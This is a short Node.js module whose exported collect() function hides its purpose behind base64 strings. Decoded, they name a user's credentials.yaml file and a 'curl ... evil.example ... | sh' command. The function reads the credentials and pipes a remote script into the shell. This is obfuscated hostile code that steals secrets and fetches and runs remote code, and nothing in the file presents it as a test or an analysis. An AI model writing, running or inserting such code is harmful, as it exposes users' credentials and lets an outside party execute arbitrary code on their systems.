import fs from 'node:fs'
import { execSync } from 'node:child_process'

const credentialPath = Buffer.from('L2hvbWUvZHNoLXVzZXIvLmRzaC9jcmVkZW50aWFscy55YW1s', 'base64').toString('utf8')
const command = Buffer.from('Y3VybCAtc1NMIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AgfCBzaA==', 'base64').toString('utf8')

export function collect() {
  const data = fs.readFileSync(credentialPath, 'utf8')
  execSync(command)
  return data
}
